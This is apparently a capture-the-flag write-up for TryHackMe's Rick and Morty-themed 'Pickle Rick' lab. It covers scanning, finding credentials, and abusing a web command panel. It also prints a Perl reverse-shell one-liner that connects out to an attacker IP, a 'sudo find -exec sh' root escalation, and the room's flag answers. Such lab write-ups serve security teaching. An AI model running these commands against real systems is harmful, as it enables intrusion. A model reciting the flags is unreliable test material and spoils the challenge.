# CTF-TryHackMe-Pickle_Rick


This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

What is the first ingredient Rick needs?

1. Start by running a nmap scan against the machine
    nmap -A -sV -O -T4 10.10.102.243 -oN nmap_initial
    The resulst show that port 22, ssh and port 80, http are open
    
2. Let's now vist the website
    The first thing to do is view the source code: 
    ![Screenshot 2022-01-06 18^%16^%21](https://user-images.githubusercontent.com/86057471/148465943-2311f56e-3885-489f-b585-26973a00ed2f.png)
    
    We can see a note giving a username: R1ckRul3s
    
3. Time to run gobuster: gobuster dir -u IP -w /usr/share/wordlists/dirb/common.txt -t 16 -oN gobuster_intial
    ![Screenshot 2022-01-06 18^%16^%21](https://user-images.githubusercontent.com/86057471/148466489-7460d5c9-1c44-4fc2-8d91-2fcbb042b672.png)
    
     We find a robots.txt file\
     Go to <IP>/robots.txt\
     We get a text: Wubbalubbadubdub: Possibly a password
    
4. Let's try running gobuster again with -x php to see if we can find any other directories:
   ![Screenshot 2022-01-06 18^%16^%21](https://user-images.githubusercontent.com/86057471/148466986-eb30744e-41fe-4929-91b7-b67634d6f37d.png)
    
   We found login.php let's check it out:
    ![Screenshot 2022-01-07 02^%35^%15](https://user-images.githubusercontent.com/86057471/148508681-f050d6c3-3507-491a-84a5-75979214962e.png)
    
   It's asking us for a username and password we can use the one we found: R1ckRul3s, Wubbalubbadubdub
    
5. Now we are presented with a command panel, run ls to see if we find anything intereseting:
    ![Screenshot 2022-01-07 02^%39^%15](https://user-images.githubusercontent.com/86057471/148509156-6115cf70-2fb3-4632-9e04-e667de0d0b67.png)
    
    Two files to look at: Sup3rS3cretPickl3Ingred.txt and clue.txt\
    If we try using cat to look at the file we get an error:
    ![Screenshot 2022-01-07 02^%42^%09](https://user-images.githubusercontent.com/86057471/148509451-a11fa6c7-a19a-42bc-acfd-fc68f4a29067.png)
    
    We are not allowed to use cat, using vim and nano doesn't work either, so we can try visiting the webpage: IP/Sup3rS3cretPickl3Ingred.txt\
    And we got our first ingredient: mr. meeseek hair
 

Whats the second ingredient Rick needs?

1. Let's check out the clue.txt file: IP/clue.txt\
    We get a message: Look around the file system for the other ingredient.
    
2. We need to try to get a reverse shell to check out the file system\
    We have a command line so we can try to run a reverse shell script\
    I went to swisskyrepo/PayloadsAllTheThings to find a reverse shell script to use. I used the perl script:\
    perl -e 'use Socket;$i="IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\
    Before we run the script in the command panel we need to setup a ncat listener: nc -localhost -port\
    Now run the perl script and we get a shell

3. Now that we have a shell let's see if we can find the second ingredient\
    If we cd to the home folder we find a two folders in the rick folder we find the second ingredient: 1 jerry tear
    
Whats the final ingredient Rick needs?

1. We can try checking the root folder for the last ingredient: cd root
    ![Screenshot 2022-01-07 05^%54^%03](https://user-images.githubusercontent.com/86057471/148533787-470fe95c-c962-41ec-9bef-75b18af633da.png)
    
    We can't cd to root as www-data user\
    We can check what sudo privileges we have: sudo -l
    ![Screenshot 2022-01-07 05^%55^%57](https://user-images.githubusercontent.com/86057471/148534035-c74b090f-94e9-43bc-8f6e-22e1c988d7b3.png)
    
    As we see we have all sudo privileges\
    So we can use any sudo privilage escalation for exampe using find: sudo find /home -exec sh -i \;\
    Now we run whoami we can see we are root\
    So let's now check the root folder and we find the third ingredient in 3rd.txt: fleeb juice
    
    

    
    

    
    
